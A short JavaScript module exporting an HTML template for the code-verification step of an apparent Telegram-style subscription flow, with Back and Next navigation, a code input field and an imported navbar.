import navbar from './navbar'

const subscription2 = `
    <div class="subscription2" >

        <header class="header" >
            <nav>
                <div class="header__container" >
                    <div id="header__left" class="header__left" >
                        <span class="back" ><a href="javascript:void(0);" onclick="Routing('#subscription')" >Back</a></span>                    
                    </div> 
                    <div id="header__center" class="header__center" >
                        <span></span>
                    </div> 
                    <div id="header__right" class="header__right" >
                        <span class="hidden" ><a href="javascript:void(0);" onclick="Routing('#subscription3')" >Next</a></span>
                    </div> 
                </div>
            </nav>
        </header>

        <div class="subscription2__container">
            <img class="subscription2__introimage" src="assets/icons/devices.svg" alt="devices" >
            <h2 class="subscription2__title title-small" >Check your Telegram messaged</h2>
            <p class="subscription2__text" >We’ve sent the code to the Telegram app on your other device</p>

            <form action="" class="validateForm" autocomplete="off" >                    
                <div class="field">
                    <input type="text" name="code" placeholder="Code" class="text-center" >
                </div>
                <p class="subscription2__form__message">Send the code as an SMS</p>
            </form>
        </div>

        ${navbar}

    </div>
`

export default subscription2